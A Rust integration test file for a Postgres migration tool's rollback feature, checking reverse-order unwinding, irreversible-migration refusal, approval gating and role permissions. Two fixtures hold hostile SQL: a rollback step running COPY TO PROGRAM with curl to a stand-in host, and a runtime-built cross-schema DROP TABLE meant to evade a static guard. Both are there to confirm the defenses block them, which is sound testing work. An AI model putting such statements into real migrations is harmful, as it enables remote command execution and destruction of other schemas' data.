//! Faithful rollback (Plan 5 §5) tests against a REAL Postgres (no shims).
//!
//! Rollback is data-integrity-critical, so these run the real path: `apply` to
//! seed state, then `executor::rollback` / `engine::rollback`, asserting on the
//! actual schema (tables dropped), the append-only journal (`rolled_back` events,
//! `applied()` net state), the down's guard + role defenses, and re-applicability.
//!
//! Requires the dedicated database `zeroship_migrate_test` on :5440 with a
//! `CREATEROLE` connecting role (runbook uses `postgres`). Set `MIGRATE_TEST_DB`
//! to override. Each test uses uniquely-suffixed schemas + project id so they are
//! isolated + re-runnable.

use std::time::Duration;

use compio_postgres::Client;
use zeroship_migrate::executor::{
    rollback, RollbackError, RollbackOptions, RollbackRequest, RollbackTarget,
};
use zeroship_migrate::migration::Checksum;
use zeroship_migrate::role::deprovision_migrator;
use zeroship_migrate::{
    apply, ensure_journal, journal, migrator_role_name, provision_migrator, Approval,
    ExecutorConfig, Migration, MigrationEngine, MigrationFlags, MigrationId, Phase,
};

const DEFAULT_DSN: &str =
    "host=localhost port=5440 user=postgres password=zeroship dbname=zeroship_migrate_test";

fn dsn() -> String {
    std::env::var("MIGRATE_TEST_DB").unwrap_or_else(|_| DEFAULT_DSN.to_string())
}

async fn pg() -> Client {
    let (client, conn) = compio_postgres::connect(&dsn(), compio_postgres::NoTls)
        .await
        .expect("connect to zeroship_migrate_test on :5440");
    compio::runtime::spawn(async move {
        let _ = conn.run().await;
    })
    .detach();
    client
}

fn token() -> String {
    use std::sync::atomic::{AtomicU64, Ordering};
    static N: AtomicU64 = AtomicU64::new(0);
    let n = N.fetch_add(1, Ordering::SeqCst);
    let pid = std::process::id();
    let nanos = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap()
        .as_nanos();
    format!("{pid}_{nanos}_{n}")
}

/// A config WITHOUT a migrator role (role-free path; admin runs downs).
fn cfg_for(tok: &str) -> ExecutorConfig {
    let mut c = ExecutorConfig::new(format!("prj_{tok}"), format!("proj_{tok}"));
    c.meta_schema = format!("meta_{tok}");
    c
}

/// A config WITH a provisioned migrator role (line-2 path).
fn cfg_for_role(tok: &str) -> ExecutorConfig {
    let mut c = cfg_for(tok);
    let role = migrator_role_name(&c.project_id).unwrap();
    c.migrator_role = Some(role);
    c
}

async fn ensure_project_schema(conn: &Client, cfg: &ExecutorConfig) {
    conn.batch_execute(&format!(
        "CREATE SCHEMA IF NOT EXISTS \"{}\"",
        cfg.project_schema
    ))
    .await
    .expect("create project schema");
}

async fn drop_schemas(conn: &Client, cfg: &ExecutorConfig) {
    let _ = deprovision_migrator(conn, cfg).await;
    let _ = conn
        .batch_execute(&format!(
            "DROP SCHEMA IF EXISTS \"{}\" CASCADE; DROP SCHEMA IF EXISTS \"{}\" CASCADE;",
            cfg.project_schema, cfg.meta_schema
        ))
        .await;
}

/// A reversible migration whose `up` creates `<schema>.<table>` and `down` drops it.
fn create_table_mig(
    version: MigrationId,
    cfg: &ExecutorConfig,
    table: &str,
) -> Migration {
    let up = format!("CREATE TABLE \"{}\".\"{table}\" (id bigint)", cfg.project_schema);
    let down = format!("DROP TABLE \"{}\".\"{table}\"", cfg.project_schema);
    Migration {
        version,
        name: format!("create_{table}"),
        up: up.clone(),
        down: Some(down.clone()),
        checksum: Checksum::of(&up, Some(&down)),
        flags: MigrationFlags {
            destructive: false,
            ..MigrationFlags::default()
        },
        owner_app: "app_test".into(),
        depends_on: Vec::new(),
    }
}

async fn table_exists(conn: &Client, schema: &str, table: &str) -> bool {
    let rows = conn
        .query(
            "SELECT 1 FROM information_schema.tables WHERE table_schema = $1 AND table_name = $2",
            &[&schema, &table],
        )
        .await
        .expect("query table existence");
    !rows.is_empty()
}

/// The set of net-applied versions (latest event completed), ascending.
async fn applied_versions(conn: &Client, cfg: &ExecutorConfig) -> Vec<String> {
    journal::applied(conn, cfg)
        .await
        .expect("read journal")
        .into_iter()
        .filter(|e| e.phase == Phase::Completed)
        .map(|e| e.version)
        .collect()
}

/// Count `rolled_back` events for a version in the rollback event log.
async fn rolled_back_count(conn: &Client, cfg: &ExecutorConfig, version: &str) -> i64 {
    conn.query_one(
        &format!(
            "SELECT count(*)::bigint AS c FROM \"{}\".schema_migrations_rolled_back WHERE version = $1",
            cfg.meta_schema
        ),
        &[&version],
    )
    .await
    .expect("rolled_back count")
    .get("c")
}

/// Apply three reversible create-table migrations (v1 < v2 < v3) and return them.
async fn seed_three(conn: &Client, cfg: &ExecutorConfig) -> [Migration; 3] {
    let v1 = MigrationId::generate();
    std::thread::sleep(Duration::from_millis(2));
    let v2 = MigrationId::generate();
    std::thread::sleep(Duration::from_millis(2));
    let v3 = MigrationId::generate();
    let m1 = create_table_mig(v1, cfg, "t1");
    let m2 = create_table_mig(v2, cfg, "t2");
    let m3 = create_table_mig(v3, cfg, "t3");
    let set = [m1.clone(), m2.clone(), m3.clone()];
    apply(conn, cfg, &set, "actor").await.expect("seed apply");
    set
}

// ---------------------------------------------------------------------------
// Core rollback: ToVersion(1) unwinds 3,2 in reverse; re-apply works.
// ---------------------------------------------------------------------------

#[compio::test]
async fn rollback_to_version_unwinds_in_reverse_and_is_reappliable() {
    let conn = pg().await;
    let tok = token();
    let cfg = cfg_for(&tok);
    drop_schemas(&conn, &cfg).await;
    ensure_project_schema(&conn, &cfg).await;

    let [m1, m2, m3] = seed_three(&conn, &cfg).await;
    // All three tables exist; all three are net-applied.
    for t in ["t1", "t2", "t3"] {
        assert!(table_exists(&conn, &cfg.project_schema, t).await, "{t} should exist");
    }
    assert_eq!(
        applied_versions(&conn, &cfg).await,
        vec![m1.version.as_str(), m2.version.as_str(), m3.version.as_str()]
    );

    // Roll back to v1: downs of 3 then 2 (reverse) run; v1 stays.
    let set = [m1.clone(), m2.clone(), m3.clone()];
    let out = rollback(
        &conn,
        &cfg,
        &set,
        RollbackRequest::new(RollbackTarget::ToVersion(m1.version.clone())),
        "actor",
    )
    .await
    .expect("rollback to v1");
    // Reverse order: v3 then v2.
    assert_eq!(
        out.rolled_back,
        vec![m3.version.as_str().to_string(), m2.version.as_str().to_string()],
        "downs must run newest-first (reverse version order)"
    );
    assert!(out.skipped_irreversible.is_empty());

    // The dropped tables are gone; t1 remains.
    assert!(table_exists(&conn, &cfg.project_schema, "t1").await, "t1 kept");
    assert!(!table_exists(&conn, &cfg.project_schema, "t2").await, "t2 dropped");
    assert!(!table_exists(&conn, &cfg.project_schema, "t3").await, "t3 dropped");

    // Journal shows their rolled_back events; completed rows NOT deleted.
    assert_eq!(rolled_back_count(&conn, &cfg, m2.version.as_str()).await, 1);
    assert_eq!(rolled_back_count(&conn, &cfg, m3.version.as_str()).await, 1);
    let completed_rows: i64 = conn
        .query_one(
            &format!(
                "SELECT count(*)::bigint AS c FROM \"{}\".schema_migrations",
                cfg.meta_schema
            ),
            &[],
        )
        .await
        .expect("completed count")
        .get("c");
    assert_eq!(completed_rows, 3, "completed rows are append-only (not deleted on rollback)");

    // applied() net state == [v1] (2,3 became pending again).
    assert_eq!(applied_versions(&conn, &cfg).await, vec![m1.version.as_str()]);

    // RE-APPLY 2,3: they are pending again and re-apply cleanly.
    let out2 = apply(&conn, &cfg, &set, "actor").await.expect("re-apply");
    assert_eq!(
        out2.applied,
        vec![m2.version.as_str().to_string(), m3.version.as_str().to_string()],
        "rolled-back migrations are pending again and re-apply"
    );
    assert!(table_exists(&conn, &cfg.project_schema, "t2").await, "t2 re-created");
    assert!(table_exists(&conn, &cfg.project_schema, "t3").await, "t3 re-created");
    // Net applied is all three again.
    assert_eq!(
        applied_versions(&conn, &cfg).await,
        vec![m1.version.as_str(), m2.version.as_str(), m3.version.as_str()]
    );

    drop_schemas(&conn, &cfg).await;
}

// ---------------------------------------------------------------------------
// Steps(1) and All targets.
// ---------------------------------------------------------------------------

#[compio::test]
async fn rollback_steps_one_unwinds_only_the_newest() {
    let conn = pg().await;
    let tok = token();
    let cfg = cfg_for(&tok);
    drop_schemas(&conn, &cfg).await;
    ensure_project_schema(&conn, &cfg).await;

    let [m1, m2, m3] = seed_three(&conn, &cfg).await;
    let set = [m1.clone(), m2.clone(), m3.clone()];

    let out = rollback(&conn, &cfg, &set, RollbackRequest::new(RollbackTarget::Steps(1)), "actor")
        .await
        .expect("rollback 1 step");
    assert_eq!(out.rolled_back, vec![m3.version.as_str().to_string()]);
    assert!(table_exists(&conn, &cfg.project_schema, "t2").await);
    assert!(!table_exists(&conn, &cfg.project_schema, "t3").await);
    assert_eq!(
        applied_versions(&conn, &cfg).await,
        vec![m1.version.as_str(), m2.version.as_str()]
    );

    drop_schemas(&conn, &cfg).await;
}

#[compio::test]
async fn rollback_all_unwinds_everything_in_reverse() {
    let conn = pg().await;
    let tok = token();
    let cfg = cfg_for(&tok);
    drop_schemas(&conn, &cfg).await;
    ensure_project_schema(&conn, &cfg).await;

    let [m1, m2, m3] = seed_three(&conn, &cfg).await;
    let set = [m1.clone(), m2.clone(), m3.clone()];

    let out = rollback(&conn, &cfg, &set, RollbackRequest::new(RollbackTarget::All), "actor")
        .await
        .expect("rollback all");
    assert_eq!(
        out.rolled_back,
        vec![
            m3.version.as_str().to_string(),
            m2.version.as_str().to_string(),
            m1.version.as_str().to_string()
        ]
    );
    for t in ["t1", "t2", "t3"] {
        assert!(!table_exists(&conn, &cfg.project_schema, t).await, "{t} dropped");
    }
    assert!(applied_versions(&conn, &cfg).await.is_empty(), "nothing applied after rollback all");

    drop_schemas(&conn, &cfg).await;
}

// ---------------------------------------------------------------------------
// down: None — refuse by default, proceed (skip) with force.
// ---------------------------------------------------------------------------

#[compio::test]
async fn rollback_refuses_irreversible_without_force_then_skips_with_force() {
    let conn = pg().await;
    let tok = token();
    let cfg = cfg_for(&tok);
    drop_schemas(&conn, &cfg).await;
    ensure_project_schema(&conn, &cfg).await;

    // v1 reversible; v2 IRREVERSIBLE (down: None); v3 reversible.
    let v1 = MigrationId::generate();
    std::thread::sleep(Duration::from_millis(2));
    let v2 = MigrationId::generate();
    std::thread::sleep(Duration::from_millis(2));
    let v3 = MigrationId::generate();
    let m1 = create_table_mig(v1, &cfg, "t1");
    let up2 = format!("CREATE TABLE \"{}\".\"t2\" (id bigint)", cfg.project_schema);
    let m2 = Migration {
        version: v2,
        name: "irreversible_t2".into(),
        up: up2.clone(),
        down: None,
        checksum: Checksum::of(&up2, None),
        flags: MigrationFlags::default(),
        owner_app: "app_test".into(),
        depends_on: Vec::new(),
    };
    let m3 = create_table_mig(v3, &cfg, "t3");
    let set = [m1.clone(), m2.clone(), m3.clone()];
    apply(&conn, &cfg, &set, "actor").await.expect("seed");

    // Rollback ALL: would cross the irreversible v2 → refuse by default, NOTHING
    // rolled back (not even v3, which precedes the refusal — all-up-front).
    let err = rollback(&conn, &cfg, &set, RollbackRequest::new(RollbackTarget::All), "actor")
        .await
        .unwrap_err();
    assert!(matches!(err, RollbackError::Irreversible { .. }), "got {err:?}");
    // Nothing rolled back — all three tables still present, all net-applied.
    for t in ["t1", "t2", "t3"] {
        assert!(table_exists(&conn, &cfg.project_schema, t).await, "{t} survives refusal");
    }
    assert_eq!(applied_versions(&conn, &cfg).await.len(), 3);

    // With force + backup_acknowledged: proceeds, SKIPPING the irreversible v2.
    let opts = RollbackOptions { force: true, backup_acknowledged: true };
    let out = rollback(&conn, &cfg, &set, RollbackRequest::new(RollbackTarget::All).with_options(opts), "actor")
        .await
        .expect("forced rollback");
    // v3, v1 rolled back; v2 skipped (its down never ran).
    assert_eq!(
        out.rolled_back,
        vec![m3.version.as_str().to_string(), m1.version.as_str().to_string()]
    );
    assert_eq!(out.skipped_irreversible, vec![m2.version.as_str().to_string()]);
    // t1, t3 dropped; t2 (irreversible) remains and stays net-applied.
    assert!(!table_exists(&conn, &cfg.project_schema, "t1").await);
    assert!(table_exists(&conn, &cfg.project_schema, "t2").await, "irreversible t2 not dropped");
    assert!(!table_exists(&conn, &cfg.project_schema, "t3").await);
    // v2 has NO rolled_back event (down never ran) → still net-applied.
    assert_eq!(rolled_back_count(&conn, &cfg, m2.version.as_str()).await, 0);
    assert_eq!(applied_versions(&conn, &cfg).await, vec![m2.version.as_str()]);

    drop_schemas(&conn, &cfg).await;
}

#[compio::test]
async fn force_requires_both_force_and_backup_acknowledged() {
    let conn = pg().await;
    let tok = token();
    let cfg = cfg_for(&tok);
    drop_schemas(&conn, &cfg).await;
    ensure_project_schema(&conn, &cfg).await;

    let v1 = MigrationId::generate();
    let up = format!("CREATE TABLE \"{}\".\"t1\" (id bigint)", cfg.project_schema);
    let m1 = Migration {
        version: v1,
        name: "irreversible".into(),
        up: up.clone(),
        down: None,
        checksum: Checksum::of(&up, None),
        flags: MigrationFlags::default(),
        owner_app: "app_test".into(),
        depends_on: Vec::new(),
    };
    apply(&conn, &cfg, std::slice::from_ref(&m1), "actor").await.expect("seed");

    // force without backup_acknowledged is NOT enough.
    let opts = RollbackOptions { force: true, backup_acknowledged: false };
    let err = rollback(&conn, &cfg, std::slice::from_ref(&m1), RollbackRequest::new(RollbackTarget::All).with_options(opts), "actor")
        .await
        .unwrap_err();
    assert!(matches!(err, RollbackError::Irreversible { .. }), "got {err:?}");

    drop_schemas(&conn, &cfg).await;
}

// ---------------------------------------------------------------------------
// The down is SQL too — guard denial + role permission-denied.
// ---------------------------------------------------------------------------

#[compio::test]
async fn dangerous_down_is_guard_denied_and_nothing_rolled_back() {
    let conn = pg().await;
    let tok = token();
    let cfg = cfg_for(&tok);
    drop_schemas(&conn, &cfg).await;
    ensure_project_schema(&conn, &cfg).await;

    // A migration whose `up` is benign but whose `down` is RCE (COPY … PROGRAM).
    // The down must go through the SAME guard as the up — guard-denied up front,
    // so the down never executes.
    let v = MigrationId::generate();
    let up = format!("CREATE TABLE \"{}\".\"t\" (id bigint)", cfg.project_schema);
    let down = format!("COPY \"{}\".\"t\" TO PROGRAM 'curl evil.test'", cfg.project_schema);
    let m = Migration {
        version: v,
        name: "rce_down".into(),
        up: up.clone(),
        down: Some(down.clone()),
        checksum: Checksum::of(&up, Some(&down)),
        flags: MigrationFlags::default(),
        owner_app: "app_test".into(),
        depends_on: Vec::new(),
    };
    apply(&conn, &cfg, std::slice::from_ref(&m), "actor").await.expect("seed (up is benign)");
    assert!(table_exists(&conn, &cfg.project_schema, "t").await);

    let err = rollback(&conn, &cfg, std::slice::from_ref(&m), RollbackRequest::new(RollbackTarget::All), "actor")
        .await
        .unwrap_err();
    assert!(matches!(err, RollbackError::Guard { .. }), "down RCE must be guard-denied, got {err:?}");
    // Nothing rolled back: the table is untouched, no rolled_back event.
    assert!(table_exists(&conn, &cfg.project_schema, "t").await, "guard-denied down must not run");
    assert_eq!(rolled_back_count(&conn, &cfg, m.version.as_str()).await, 0);
    assert_eq!(applied_versions(&conn, &cfg).await.len(), 1, "still applied");

    drop_schemas(&conn, &cfg).await;
}

#[compio::test]
async fn cross_schema_down_is_permission_denied_by_the_migrator_role() {
    let conn = pg().await;
    let tok = token();
    let cfg = cfg_for_role(&tok);
    drop_schemas(&conn, &cfg).await;
    ensure_project_schema(&conn, &cfg).await;
    provision_migrator(&conn, &cfg).await.expect("provision migrator");

    // A foreign schema the migrator must never reach.
    conn.batch_execute("CREATE SCHEMA IF NOT EXISTS rb_foreign_victim; \
                        CREATE TABLE IF NOT EXISTS rb_foreign_victim.secret (id bigint)")
        .await
        .expect("seed foreign schema");

    // The `down` is a RUNTIME-CONSTRUCTED cross-schema DROP that evades the static
    // guard (schema name assembled in a DO block), so line-2 (the role) is what
    // stops it: SET LOCAL ROLE migrator → permission denied at execution.
    let v = MigrationId::generate();
    let up = format!("CREATE TABLE \"{}\".\"t\" (id bigint)", cfg.project_schema);
    let down = "DO $$ BEGIN EXECUTE format('DROP TABLE %I.secret', 'rb_foreign_victim'); END $$;".to_string();
    let m = Migration {
        version: v,
        name: "xschema_down".into(),
        up: up.clone(),
        down: Some(down.clone()),
        checksum: Checksum::of(&up, Some(&down)),
        flags: MigrationFlags::default(),
        owner_app: "app_test".into(),
        depends_on: Vec::new(),
    };
    apply(&conn, &cfg, std::slice::from_ref(&m), "actor").await.expect("seed");

    let err = rollback(&conn, &cfg, std::slice::from_ref(&m), RollbackRequest::new(RollbackTarget::All), "actor")
        .await
        .unwrap_err();
    // The down ran under the migrator role and was denied at execution.
    let RollbackError::DownFailed { source, .. } = &err else {
        panic!("expected DownFailed (permission denied), got {err:?}");
    };
    assert_eq!(
        source.code(),
        Some(&compio_postgres::error::SqlState::INSUFFICIENT_PRIVILEGE),
        "cross-schema down must be permission-denied by the role"
    );
    // The foreign table survives; the txn rolled back so no rolled_back event.
    assert!(
        table_exists(&conn, "rb_foreign_victim", "secret").await,
        "the migrator must not be able to drop a foreign table via its down"
    );
    assert_eq!(rolled_back_count(&conn, &cfg, m.version.as_str()).await, 0);
    assert_eq!(applied_versions(&conn, &cfg).await.len(), 1, "still applied (down failed atomically)");

    // Cleanup the extra foreign schema.
    let _ = conn.batch_execute("DROP SCHEMA IF EXISTS rb_foreign_victim CASCADE").await;
    drop_schemas(&conn, &cfg).await;
}

#[compio::test]
async fn down_runs_under_migrator_role_for_own_schema() {
    // The happy path under the role: a down that drops the migrator's OWN table
    // succeeds under SET LOCAL ROLE migrator, and the rolled_back event is written
    // by the admin (the migrator has no meta grant).
    let conn = pg().await;
    let tok = token();
    let cfg = cfg_for_role(&tok);
    drop_schemas(&conn, &cfg).await;
    ensure_project_schema(&conn, &cfg).await;
    provision_migrator(&conn, &cfg).await.expect("provision");

    let v = MigrationId::generate();
    let m = create_table_mig(v, &cfg, "owned");
    apply(&conn, &cfg, std::slice::from_ref(&m), "actor").await.expect("seed");
    assert!(table_exists(&conn, &cfg.project_schema, "owned").await);

    let out = rollback(&conn, &cfg, std::slice::from_ref(&m), RollbackRequest::new(RollbackTarget::All), "actor")
        .await
        .expect("rollback own-schema down");
    assert_eq!(out.rolled_back, vec![m.version.as_str().to_string()]);
    assert!(!table_exists(&conn, &cfg.project_schema, "owned").await, "own table dropped by down");
    // The rolled_back event was written (by admin).
    assert_eq!(rolled_back_count(&conn, &cfg, m.version.as_str()).await, 1);
    assert!(applied_versions(&conn, &cfg).await.is_empty());

    drop_schemas(&conn, &cfg).await;
}

// ---------------------------------------------------------------------------
// Edge cases: unknown target, not-applied version, missing-from-set.
// ---------------------------------------------------------------------------

#[compio::test]
async fn rollback_of_not_applied_version_is_a_clear_error() {
    let conn = pg().await;
    let tok = token();
    let cfg = cfg_for(&tok);
    drop_schemas(&conn, &cfg).await;
    ensure_project_schema(&conn, &cfg).await;
    ensure_journal(&conn, &cfg).await.expect("bootstrap");

    // ToVersion targeting a version that was never applied.
    let ghost = MigrationId::generate();
    let err = rollback(&conn, &cfg, &[], RollbackRequest::new(RollbackTarget::ToVersion(ghost.clone())), "actor")
        .await
        .unwrap_err();
    assert!(matches!(err, RollbackError::UnknownTarget { .. }), "got {err:?}");

    drop_schemas(&conn, &cfg).await;
}

#[compio::test]
async fn rollback_all_with_nothing_applied_is_a_noop() {
    let conn = pg().await;
    let tok = token();
    let cfg = cfg_for(&tok);
    drop_schemas(&conn, &cfg).await;
    ensure_project_schema(&conn, &cfg).await;

    let out = rollback(&conn, &cfg, &[], RollbackRequest::new(RollbackTarget::All), "actor")
        .await
        .expect("no-op rollback");
    assert!(out.is_noop(), "rolling back an empty journal is a no-op");

    drop_schemas(&conn, &cfg).await;
}

#[compio::test]
async fn rollback_of_applied_version_absent_from_set_errors() {
    let conn = pg().await;
    let tok = token();
    let cfg = cfg_for(&tok);
    drop_schemas(&conn, &cfg).await;
    ensure_project_schema(&conn, &cfg).await;

    let v = MigrationId::generate();
    let m = create_table_mig(v, &cfg, "t");
    apply(&conn, &cfg, std::slice::from_ref(&m), "actor").await.expect("seed");

    // Roll back but supply an EMPTY set — its down SQL is unavailable.
    let err = rollback(&conn, &cfg, &[], RollbackRequest::new(RollbackTarget::All), "actor")
        .await
        .unwrap_err();
    assert!(matches!(err, RollbackError::MissingFromSet { .. }), "got {err:?}");
    // Nothing rolled back: the table survives.
    assert!(table_exists(&conn, &cfg.project_schema, "t").await);

    drop_schemas(&conn, &cfg).await;
}

// ---------------------------------------------------------------------------
// Engine-level gate: rollback requires Approval::Approved.
// ---------------------------------------------------------------------------

#[compio::test]
async fn engine_rollback_requires_approval() {
    let conn = pg().await;
    let tok = token();
    let cfg = cfg_for(&tok);
    drop_schemas(&conn, &cfg).await;
    ensure_project_schema(&conn, &cfg).await;

    let v = MigrationId::generate();
    let m = create_table_mig(v, &cfg, "t");
    apply(&conn, &cfg, std::slice::from_ref(&m), "actor").await.expect("seed");

    let engine = MigrationEngine::new();
    // Without approval: gated, nothing rolled back.
    let err = engine
        .rollback(
            std::slice::from_ref(&m),
            RollbackRequest::new(RollbackTarget::All),
            Approval::None,
            &conn,
            &cfg,
            "actor",
        )
        .await
        .unwrap_err();
    assert!(
        matches!(err, zeroship_migrate::RollbackEngineError::ApprovalRequired),
        "got {err:?}"
    );
    assert!(table_exists(&conn, &cfg.project_schema, "t").await, "no-approval rollback ran nothing");

    // With approval: proceeds.
    let out = engine
        .rollback(
            std::slice::from_ref(&m),
            RollbackRequest::new(RollbackTarget::All),
            Approval::Approved,
            &conn,
            &cfg,
            "actor",
        )
        .await
        .expect("approved rollback");
    assert_eq!(out.rolled_back, vec![m.version.as_str().to_string()]);
    assert!(!table_exists(&conn, &cfg.project_schema, "t").await);

    drop_schemas(&conn, &cfg).await;
}
